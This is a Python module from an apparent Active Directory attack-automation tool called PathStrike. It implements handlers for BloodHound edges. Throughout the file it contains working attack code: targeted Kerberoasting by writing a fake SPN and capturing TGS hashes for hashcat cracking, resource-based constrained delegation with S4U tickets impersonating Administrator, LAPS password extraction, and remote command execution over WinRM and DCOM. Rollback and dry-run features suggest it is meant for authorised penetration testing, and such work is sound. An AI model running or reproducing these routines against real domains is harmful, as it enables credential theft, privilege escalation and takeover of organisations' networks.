"""P1 extended access handlers for lateral movement and privilege escalation.

Implements handlers for the following BloodHound edge types:

* **CanRDP** -- RDP access to a target computer.
* **CanPSRemote** -- PowerShell Remoting / WinRM access to a target.
* **ExecuteDCOM** -- DCOM-based command execution on a target computer.
* **AddAllowedToAct** -- Resource-Based Constrained Delegation (RBCD) setup.
* **WriteSPN** -- Targeted Kerberoasting via SPN modification.
* **SyncLAPSPassword** -- LAPS password retrieval through sync rights.

Also exposes :func:`perform_targeted_kerberoast` as a free function so
other handlers (notably :class:`pathstrike.handlers.acl.ACLHandler`) can
fall back to the same SPN-based Kerberoast flow when shadow-credential
strategies fail (typically against DCs without PKINIT support).
"""

from __future__ import annotations

import logging
import re
import shutil
from datetime import datetime, timezone
from pathlib import Path

from pathstrike.config import PathStrikeConfig
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools.bloodyad_wrapper import (
    read_laps,
    remove_rbcd,
    run_bloodyad,
    set_rbcd,
)
from pathstrike.tools.impacket_wrapper import (
    build_impacket_auth,
    dcomexec,
    get_st,
    kerberoast,
    run_impacket_tool,
    secretsdump,
)
from pathstrike.tools.netexec_wrapper import (
    check_admin,
    check_rdp,
    check_winrm,
    dump_laps,
    execute_command,
    run_netexec,
)


# ===================================================================
# Shared helper: Targeted Kerberoast via bloodyAD + impacket
# ===================================================================


async def perform_targeted_kerberoast(
    config: PathStrikeConfig,
    cred_store: CredentialStore,
    source_principal: str,
    target_user: str,
    auth_args: list[str],
    logger: logging.Logger,
) -> tuple[bool, str, list[Credential], str | None]:
    """Set a fake SPN on *target_user*, Kerberoast it, then clear the SPN.

    Useful as a fallback whenever Shadow Credentials cannot succeed
    against a DC that lacks PKINIT support (no KDC certificate
    installed) but the source principal has GenericWrite / WriteSPN
    rights over the target.  The captured TGS-REP hash is written to
    ``~/.pathstrike/kerberoast/<target>_<timestamp>.hash`` for offline
    cracking and logged inline at INFO so it's visible to the operator.

    The cleanup uses ``bloodyAD set object <target> servicePrincipalName``
    with no ``-v`` argument, which clears the entire attribute.  This is
    safe for typical Kerberoast candidates (users without prior SPNs);
    callers that need value-preserving cleanup must read and restore the
    original list themselves.

    Args:
        config: PathStrike config (domain / DC info).
        cred_store: Credential store to look up *source_principal*'s best
            available credential.
        source_principal: Account to authenticate as for both the SPN
            write (bloodyAD) and the TGS request (impacket).
        target_user: User account to modify and roast.
        auth_args: Pre-built bloodyAD auth args for *source_principal*.
        logger: Logger for status messages.

    Returns:
        Tuple of ``(success, message, new_credentials, leftover_spn)``.

        * ``new_credentials`` is empty — the captured TGS hash needs
          offline cracking before it can be used as a chainable cred.
        * ``leftover_spn`` is non-None only if the cleanup-clear failed,
          so callers can record a rollback entry for manual cleanup.
    """
    domain = config.domain.name
    dc_ip = config.domain.dc_host
    fake_spn = f"pathstrike/{target_user}.{domain}"

    # Step 1 — write the SPN.
    logger.info(
        "Targeted Kerberoast on '%s': setting servicePrincipalName='%s'",
        target_user, fake_spn,
    )
    spn_set = await run_bloodyad(
        ["set", "object", target_user, "servicePrincipalName", "-v", fake_spn],
        config,
        auth_args=auth_args,
    )
    if not spn_set["success"]:
        return (
            False,
            f"Failed to set SPN on '{target_user}': "
            f"{spn_set.get('error', 'unknown')}",
            [],
            None,  # nothing to roll back — write didn't land
        )
    leftover_spn: str | None = fake_spn

    # Step 2 — request the TGS for that SPN.
    logger.info(
        "Targeted Kerberoast on '%s': requesting TGS for '%s'",
        target_user, fake_spn,
    )
    cred = cred_store.get_best_credential(source_principal, domain)
    password: str | None = None
    nt_hash: str | None = None
    if cred is not None:
        if cred.cred_type == CredentialType.password:
            password = cred.value
        elif cred.cred_type == CredentialType.nt_hash:
            nt_hash = cred.value
    if password is None and nt_hash is None:
        password = config.credentials.password
        nt_hash = config.credentials.nt_hash

    imp_auth = build_impacket_auth(
        domain, source_principal, password, nt_hash, dc_ip=dc_ip,
    )
    # NB: ``kerberoast`` builds its own ``DOMAIN/user:password`` target
    # string internally, so we must forward password/nt_hash here as
    # well — passing them only to build_impacket_auth leaves the target
    # string's credential slot empty and the GetUserSPNs.py invocation
    # ends up unauthenticated (which then either hangs or returns
    # zero hashes).
    roast = await kerberoast(
        domain=domain,
        username=source_principal,
        auth_args=imp_auth,
        password=password,
        nt_hash=nt_hash,
        dc_ip=dc_ip,
        target_user=target_user,
    )

    # Step 3 — ALWAYS attempt cleanup (even if the roast failed),
    # because the SPN write *did* land and we don't want to leave
    # AD state polluted.  Clearing the attribute (no ``-v``) is the
    # standard idiom; production callers concerned about pre-existing
    # SPN values should use a value-preserving variant instead.
    logger.info(
        "Targeted Kerberoast on '%s': clearing servicePrincipalName",
        target_user,
    )
    spn_clear = await run_bloodyad(
        ["set", "object", target_user, "servicePrincipalName"],
        config,
        auth_args=auth_args,
    )
    if spn_clear["success"]:
        leftover_spn = None  # AD is back to a clean state
    else:
        logger.warning(
            "SPN cleanup on '%s' failed: %s. Manual cleanup may be "
            "needed (e.g. `bloodyAD set object %s servicePrincipalName`).",
            target_user, spn_clear.get("error", "unknown"), target_user,
        )

    if not roast["success"]:
        return (
            False,
            f"Kerberoast failed on '{target_user}': "
            f"{roast.get('error', 'unknown')}",
            [],
            leftover_spn,
        )

    parsed = roast.get("parsed") or {}
    tgs_hashes = parsed.get("tgs_hashes") or []
    if not tgs_hashes:
        return (
            False,
            f"Kerberoast returned no TGS hashes for '{target_user}'.",
            [],
            leftover_spn,
        )

    # Persist hash(es) so the operator can crack them offline.
    hash_dir = Path.home() / ".pathstrike" / "kerberoast"
    hash_dir.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    hash_file = hash_dir / f"{target_user}_{timestamp}.hash"
    hash_file.write_text(
        "\n".join(entry.get("hash", "") for entry in tgs_hashes) + "\n",
        encoding="utf-8",
    )

    # Echo the hash itself at INFO so it surfaces above the Live render
    # in the session log even if the operator misses the file path.
    for entry in tgs_hashes:
        logger.info(
            "Captured TGS hash for %s (SPN=%s): %s",
            entry.get("username", target_user),
            entry.get("spn", fake_spn),
            entry.get("hash", ""),
        )
    logger.info(
        "Saved %d TGS hash(es) to %s — crack with `hashcat -m 13100 %s <wordlist>`",
        len(tgs_hashes), hash_file, hash_file,
    )

    msg = (
        f"Targeted Kerberoast succeeded on '{target_user}' — "
        f"{len(tgs_hashes)} TGS hash(es) saved to {hash_file}. "
        f"Crack offline (hashcat -m 13100) then re-run with the "
        f"recovered password."
    )
    return (True, msg, [], leftover_spn)


# ===================================================================
# CanRDP: RDP access to target computer
# ===================================================================


@register_handler("CanRDP")
class CanRDPHandler(BaseEdgeHandler):
    """RDP access to target computer.

    This edge indicates the source principal has Remote Desktop access to
    the target computer. This handler is primarily informational -- it
    validates that RDP connectivity and authentication succeed.

    Attack flow:
        1. Verify RDP access via netexec rdp.
        2. Optionally verify local admin via SMB.
        3. Report access level.

    This is a pass-through edge: it does not yield new credentials but
    confirms lateral movement capability.

    Rollback:
        None -- read-only validation.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        # Verify the target is a Computer
        if edge.target.label.lower() not in ("computer",):
            return (False, f"Target '{edge.target.name}' is not a Computer node.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready to verify RDP access to {edge.target.name}")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_host = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        auth_args = self._get_auth_args()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would verify RDP access to '{target_host}'.",
                [],
            )

        # Build netexec-compatible auth args
        nxc_auth = self._build_nxc_auth_args()

        # Step 1: Verify RDP access
        self.logger.info("Verifying RDP access to '%s'", target_host)
        rdp_ok = await check_rdp(target_host, nxc_auth)

        if not rdp_ok:
            return (
                False,
                f"RDP access to '{target_host}' could not be verified. "
                "The host may be unreachable or credentials may be invalid.",
                [],
            )

        # Step 2: Check if we also have local admin (bonus)
        is_admin = await check_admin(target_host, nxc_auth)

        msg = f"RDP access confirmed to '{target_host}'."
        if is_admin:
            msg += " Local admin access also detected (Pwn3d!)."

        self.logger.info(msg)
        return (True, msg, [])

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Read-only validation -- no rollback needed
        return None

    def _build_nxc_auth_args(self) -> list[str]:
        """Build netexec-compatible auth arguments from bloodyAD-style args.

        bloodyAD uses ``-p`` for both passwords and NTLM hashes
        (``-p :NTHASH`` or ``-p LMHASH:NTHASH``).  netexec uses
        ``-p`` for passwords and ``-H`` for NT hashes.
        """
        args = self._get_auth_args()
        nxc_args: list[str] = []
        i = 0
        while i < len(args):
            flag = args[i]
            if flag == "-u" and i + 1 < len(args):
                nxc_args.extend(["-u", args[i + 1]])
                i += 2
            elif flag == "-p" and i + 1 < len(args):
                value = args[i + 1]
                if value.startswith(":") or (
                    ":" in value and len(value.replace(":", "")) == 32
                ):
                    # bloodyAD -p :NTHASH or -p LMHASH:NTHASH → nxc -H
                    nt_hash = value.split(":")[-1]
                    nxc_args.extend(["-H", nt_hash])
                else:
                    nxc_args.extend(["-p", value])
                i += 2
            elif flag == "-k":
                nxc_args.extend(["-k", "--use-kcache"])
                i += 1
            elif flag == "-c" and i + 1 < len(args):
                # netexec doesn't directly support cert auth
                i += 2
            elif flag == "--dc-ip":
                # Skip bloodyAD's --dc-ip (not needed for nxc inline)
                i += 2 if (i + 1 < len(args)) else 1
            else:
                i += 1

        # Add domain
        nxc_args.extend(["-d", self._get_domain()])
        return nxc_args


# ===================================================================
# CanPSRemote: PS Remoting / WinRM access
# ===================================================================


@register_handler("CanPSRemote")
class CanPSRemoteHandler(BaseEdgeHandler):
    """PS Remoting / WinRM access to target computer.

    Attack flow:
        1. Verify WinRM access via netexec winrm.
        2. Optionally execute a command to confirm execution capability.

    WinRM access enables PowerShell remoting, which can be used for
    credential harvesting and further lateral movement.

    Rollback:
        None -- read-only validation.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() not in ("computer",):
            return (False, f"Target '{edge.target.name}' is not a Computer node.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready to verify WinRM access to {edge.target.name}")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_host = self._resolve_target(edge)

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would verify WinRM/PSRemoting access to '{target_host}'.",
                [],
            )

        nxc_auth = CanRDPHandler._build_nxc_auth_args(self)

        # Verify WinRM access
        self.logger.info("Verifying WinRM access to '%s'", target_host)
        winrm_ok = await check_winrm(target_host, nxc_auth)

        if not winrm_ok:
            return (
                False,
                f"WinRM access to '{target_host}' could not be verified.",
                [],
            )

        # Execute a simple command to confirm execution
        self.logger.info("Confirming command execution via WinRM on '%s'", target_host)
        cmd_result = await execute_command(
            "winrm", target_host, "whoami", nxc_auth
        )

        if cmd_result["success"]:
            parsed = cmd_result.get("parsed") or {}
            whoami = parsed.get("command_output", "").strip()
            msg = f"WinRM access confirmed to '{target_host}'. Running as: {whoami}"
        else:
            msg = f"WinRM access confirmed to '{target_host}' (command execution not verified)."

        self.logger.info(msg)
        return (True, msg, [])

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None


# ===================================================================
# ExecuteDCOM: DCOM execution on target computer
# ===================================================================


@register_handler("ExecuteDCOM")
class ExecuteDCOMHandler(BaseEdgeHandler):
    """DCOM execution on target computer.

    Uses Impacket's ``dcomexec.py`` to execute commands on the target via
    DCOM (typically MMC20.Application or ShellBrowserWindow COM objects).

    Attack flow:
        1. Verify DCOM execution capability with a ``whoami`` command.
        2. Optionally dump credentials from the target.

    This edge confirms command execution capability for lateral movement.

    Rollback:
        None -- command execution is ephemeral.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() not in ("computer",):
            return (False, f"Target '{edge.target.name}' is not a Computer node.")

        # Check dcomexec.py availability
        if not shutil.which("dcomexec.py"):
            return (
                False,
                "dcomexec.py not found on PATH. Ensure Impacket is installed.",
            )

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready to execute DCOM commands on {edge.target.name}")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_host = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would execute commands on '{target_host}' via DCOM.",
                [],
            )

        # Build Impacket-style auth
        target_str, auth_flags = self._get_impacket_auth()

        # Extract password/hash from config for dcomexec
        cfg = self.config.credentials
        source_user = self._resolve_principal(edge)
        cred = self.cred_store.get_best_credential(source_user, domain)

        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = cfg.password
            nt_hash = cfg.nt_hash

        # Verify DCOM execution
        self.logger.info("Executing 'whoami' on '%s' via DCOM", target_host)
        result = await dcomexec(
            target=target_host,
            command="whoami",
            auth_args=auth_flags,
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
        )

        if not result["success"]:
            return (
                False,
                f"DCOM execution failed on '{target_host}': {result.get('error', 'unknown')}",
                [],
            )

        output = result.get("output", "").strip()
        msg = f"DCOM execution confirmed on '{target_host}'. Output: {output}"
        self.logger.info(msg)

        return (True, msg, [])

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None


# ===================================================================
# AddAllowedToAct: RBCD delegation setup
# ===================================================================


@register_handler("AddAllowedToAct")
class AddAllowedToActHandler(BaseEdgeHandler):
    """Can add Resource-Based Constrained Delegation (RBCD).

    This is an explicit edge variant of ``WriteAccountRestrictions``.
    The attacker can write the ``msDS-AllowedToActOnBehalfOfOtherIdentity``
    attribute on the target computer.

    Attack flow:
        1. Set RBCD from a controlled machine account to the target computer
           using bloodyAD.
        2. Use Impacket's ``getST.py`` with S4U2Self and S4U2Proxy to
           obtain a service ticket impersonating a domain admin.
        3. Use the service ticket for further access.

    Rollback:
        Remove the RBCD entry from the target computer.
    """

    _machine_account: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not shutil.which("bloodyAD"):
            return (False, "bloodyAD not found on PATH.")
        if not shutil.which("getST.py"):
            return (False, "getST.py not found on PATH. Ensure Impacket is installed.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready to configure RBCD on {edge.target.name}")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_computer = self._resolve_target(edge)
        source_user = self._resolve_principal(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()

        # Determine the machine account to use for RBCD
        # The source may be a computer account, or we need to create/use one
        machine_account = edge.source.properties.get(
            "machine_account", f"{source_user}$"
        )
        self._machine_account = machine_account

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would set RBCD from '{machine_account}' to "
                f"'{target_computer}', then S4U to impersonate admin.",
                [],
            )

        # Step 1: Set RBCD
        self.logger.info(
            "AddAllowedToAct Step 1: Setting RBCD from '%s' to '%s'",
            machine_account, target_computer,
        )
        rbcd_result = await set_rbcd(
            self.config, auth_args, target_computer, machine_account
        )

        if not rbcd_result["success"]:
            return (
                False,
                f"RBCD setup failed: {rbcd_result.get('error', 'unknown')}",
                [],
            )

        # Step 2: S4U2Self + S4U2Proxy to get service ticket
        spn = f"cifs/{target_computer}"
        if "." not in target_computer:
            # Try FQDN from edge properties
            fqdn = edge.target.properties.get("fqdn", f"{target_computer}.{domain}")
            spn = f"cifs/{fqdn}"

        self.logger.info(
            "AddAllowedToAct Step 2: S4U2Proxy as '%s' -> impersonate Administrator "
            "for SPN='%s'",
            machine_account, spn,
        )

        # Extract machine account credentials
        machine_user = machine_account.rstrip("$")
        cfg = self.config.credentials
        cred = self.cred_store.get_best_credential(machine_user, domain)

        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = cfg.password
            nt_hash = cfg.nt_hash

        from pathstrike.tools.impacket_wrapper import build_impacket_auth

        imp_auth = build_impacket_auth(
            domain, machine_user, password, nt_hash, dc_ip=dc_host
        )

        st_result = await get_st(
            spn=spn,
            impersonate="Administrator",
            auth_args=imp_auth,
            domain=domain,
            username=machine_user,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_host,
        )

        if not st_result["success"]:
            return (
                False,
                f"S4U failed: {st_result.get('error', 'unknown')}. "
                "RBCD was set and should be rolled back.",
                [],
            )

        # Infer the ccache path from Impacket's output
        ccache_path = "Administrator.ccache"
        output = st_result.get("output", "")
        ccache_match = re.search(r"Saving ticket in (.+\.ccache)", output)
        if ccache_match:
            ccache_path = ccache_match.group(1)

        new_creds: list[Credential] = []
        ccache_cred = Credential(
            cred_type=CredentialType.ccache,
            value=ccache_path,
            username="Administrator",
            domain=domain,
            obtained_from=f"rbcd:{machine_account}->{target_computer}",
            obtained_at=datetime.now(timezone.utc),
        )
        new_creds.append(ccache_cred)
        self.cred_store.add_credential(ccache_cred)

        msg = (
            f"RBCD exploitation succeeded. Service ticket for Administrator "
            f"to '{spn}' saved at: {ccache_path}"
        )
        self.logger.info(msg)
        return (True, msg, new_creds)

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        target_computer = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        machine_account = self._machine_account or "UNKNOWN$"

        # Rollback commands omit --host/-d/--dc-ip — the RollbackManager
        # injects connection and auth args automatically for bloodyAD commands.
        return RollbackAction(
            step_index=0,
            action_type="remove_rbcd",
            description=(
                f"Remove RBCD delegation from '{machine_account}' "
                f"on '{target_computer}'"
            ),
            command=(
                f"bloodyAD remove rbcd {target_computer} {machine_account}"
            ),
            reversible=True,
        )


# ===================================================================
# WriteSPN: Targeted Kerberoast via SPN modification
# ===================================================================


@register_handler("WriteSPN")
class WriteSPNHandler(BaseEdgeHandler):
    """Can modify ``servicePrincipalName`` for Targeted Kerberoasting.

    Attack flow:
        1. Set a fake SPN on the target user account via bloodyAD.
        2. Kerberoast the target to obtain a TGS-REP hash.
        3. Return the hash for offline cracking.

    The TGS hash is returned as a credential; actual cracking is out of
    scope for the automated chain.

    Rollback:
        Remove the SPN that was added.
    """

    _added_spn: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not shutil.which("bloodyAD"):
            return (False, "bloodyAD not found on PATH.")
        if not shutil.which("GetUserSPNs.py"):
            return (
                False,
                "GetUserSPNs.py not found on PATH. Ensure Impacket is installed.",
            )

        # WriteSPN targets should be User accounts
        if edge.target.label.lower() not in ("user",):
            return (
                False,
                f"Target '{edge.target.name}' is not a User node. "
                "WriteSPN / Targeted Kerberoast only applies to user accounts.",
            )

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready for Targeted Kerberoast on {edge.target.name}")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        auth_args = self._get_auth_args()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would set a fake SPN on '{target_user}', "
                f"Kerberoast for a TGS hash, then clear the SPN.",
                [],
            )

        # All three steps (set SPN → roast → clear SPN) live in the
        # shared helper so the same flow is reused as the GenericWrite
        # fallback in ACLHandler.
        success, msg, creds, leftover_spn = await perform_targeted_kerberoast(
            self.config,
            self.cred_store,
            source_user,
            target_user,
            auth_args,
            self.logger,
        )
        # Track only the leftover (failed-cleanup) SPN for rollback.  When
        # the helper cleared the attribute itself there's nothing to roll
        # back, so _added_spn stays None.
        self._added_spn = leftover_spn
        return success, msg, creds

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        if not self._added_spn:
            # SPN was already cleaned up by the helper.
            return None

        target_user = self._resolve_target(edge)

        # Cleanup is "clear servicePrincipalName" — bloodyAD's
        # ``set object <target> <attr>`` with no ``-v`` clears the
        # attribute entirely.  This is correct for typical Kerberoast
        # candidates which had no prior SPN; for production-safe
        # behaviour callers should preserve the original list.
        # NOTE: rollback commands omit --host/-d/--dc-ip — the
        # RollbackManager injects connection + auth args for bloodyAD.
        return RollbackAction(
            step_index=0,
            action_type="clear_spn",
            description=(
                f"Clear servicePrincipalName on '{target_user}' "
                f"(leftover after cleanup-failure: '{self._added_spn}')"
            ),
            command=f"bloodyAD set object {target_user} servicePrincipalName",
            reversible=True,
        )


# ===================================================================
# SyncLAPSPassword: LAPS password retrieval
# ===================================================================


@register_handler("SyncLAPSPassword")
class SyncLAPSPasswordHandler(BaseEdgeHandler):
    """LAPS password sync right on a target computer.

    Similar to ``ReadLAPSPassword`` but through the LAPS sync mechanism
    (``ms-LAPS-Password`` / ``ms-Mcs-AdmPwd``).

    Attack flow:
        1. Read the LAPS password for the target computer via bloodyAD
           or netexec LDAP.
        2. Store the password as a credential for the local administrator.

    Rollback:
        None -- read-only operation (does not modify any AD objects).
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() not in ("computer",):
            return (False, f"Target '{edge.target.name}' is not a Computer node.")

        # At least one of bloodyAD or netexec should be available
        has_bloody = shutil.which("bloodyAD") is not None
        has_nxc = shutil.which("netexec") is not None

        if not has_bloody and not has_nxc:
            return (
                False,
                "Neither bloodyAD nor netexec found on PATH. "
                "At least one is required for LAPS password retrieval.",
            )

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready to read LAPS password for {edge.target.name}")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_computer = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would read LAPS password for '{target_computer}'.",
                [],
            )

        new_creds: list[Credential] = []
        laps_password: str | None = None

        # Try bloodyAD first (more reliable for LAPS v2)
        if shutil.which("bloodyAD"):
            self.logger.info(
                "Reading LAPS password for '%s' via bloodyAD", target_computer,
            )
            bloody_result = await read_laps(self.config, auth_args, target_computer)

            if bloody_result["success"]:
                laps_password = self._extract_laps_password(bloody_result)

        # Fallback to netexec if bloodyAD didn't get the password
        if not laps_password and shutil.which("netexec"):
            self.logger.info(
                "Trying netexec LDAP for LAPS password on '%s'", target_computer,
            )
            nxc_auth = CanRDPHandler._build_nxc_auth_args(self)
            nxc_result = await dump_laps(dc_host, nxc_auth)

            if nxc_result["success"]:
                parsed = nxc_result.get("parsed") or {}
                laps_passwords = parsed.get("laps_passwords", {})
                # Look for our target computer in the results
                for computer_name, password in laps_passwords.items():
                    if target_computer.lower() in computer_name.lower():
                        laps_password = password
                        break

        if not laps_password:
            return (
                False,
                f"Could not retrieve LAPS password for '{target_computer}'. "
                "The attribute may be empty or access may be denied.",
                [],
            )

        # Store the LAPS password as a credential for the local admin
        laps_cred = Credential(
            cred_type=CredentialType.password,
            value=laps_password,
            username="Administrator",
            domain=target_computer,  # Local admin, scoped to the computer
            obtained_from=f"laps_sync:{target_computer}",
            obtained_at=datetime.now(timezone.utc),
        )
        new_creds.append(laps_cred)
        self.cred_store.add_credential(laps_cred)

        msg = (
            f"LAPS password retrieved for '{target_computer}'. "
            f"Local Administrator credential stored."
        )
        self.logger.info(msg)
        return (True, msg, new_creds)

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Read-only -- no rollback needed
        return None

    @staticmethod
    def _extract_laps_password(result: dict) -> str | None:
        """Extract the LAPS password from bloodyAD output.

        bloodyAD may return the password in JSON parsed output or in the
        raw text output.
        """
        # Try parsed JSON
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            # Windows LAPS v2 uses 'ms-LAPS-Password'
            for key in ("ms-LAPS-Password", "ms-Mcs-AdmPwd", "p", "password", "Password"):
                if key in parsed:
                    value = parsed[key]
                    # LAPS v2 stores JSON; extract the password field
                    if isinstance(value, dict) and "p" in value:
                        return str(value["p"])
                    return str(value)

        if isinstance(parsed, list):
            for item in parsed:
                if isinstance(item, dict):
                    for key in ("ms-LAPS-Password", "ms-Mcs-AdmPwd", "p", "password"):
                        if key in item:
                            value = item[key]
                            if isinstance(value, dict) and "p" in value:
                                return str(value["p"])
                            return str(value)

        # Fall back to regex on raw output
        output = result.get("output", "")

        # LAPS v1: plain password in ms-Mcs-AdmPwd attribute
        v1_match = re.search(r"ms-Mcs-AdmPwd\s*[:=]\s*(\S+)", output, re.IGNORECASE)
        if v1_match:
            return v1_match.group(1)

        # LAPS v2: JSON blob in ms-LAPS-Password
        v2_match = re.search(r'"p"\s*:\s*"([^"]+)"', output)
        if v2_match:
            return v2_match.group(1)

        return None
